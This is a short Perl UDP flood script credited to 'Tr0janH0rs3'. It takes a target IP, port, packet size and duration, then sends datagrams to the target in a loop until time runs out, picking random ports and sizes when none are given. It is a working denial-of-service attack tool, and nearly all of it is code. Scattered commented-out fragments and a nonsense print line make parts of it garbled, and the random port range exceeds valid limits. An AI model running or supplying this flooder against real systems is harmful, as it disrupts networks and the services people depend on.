
##
# Design By Tr0janH0rs3
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Wrong ip $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
##
##dtime = time() + ($time ? $time : 100
##
##lood, PF_I
##
##
#$iaddr = inet_ato
##
##
##
print <<EOTEXT;
 hui hui hui avariq aec kozludui
EOTEXT

print "IP= $ip " . ($port ? $port : "Random") . " Bytes= " .
  ($size ? "$size" : "Disconnected!") .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+128) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}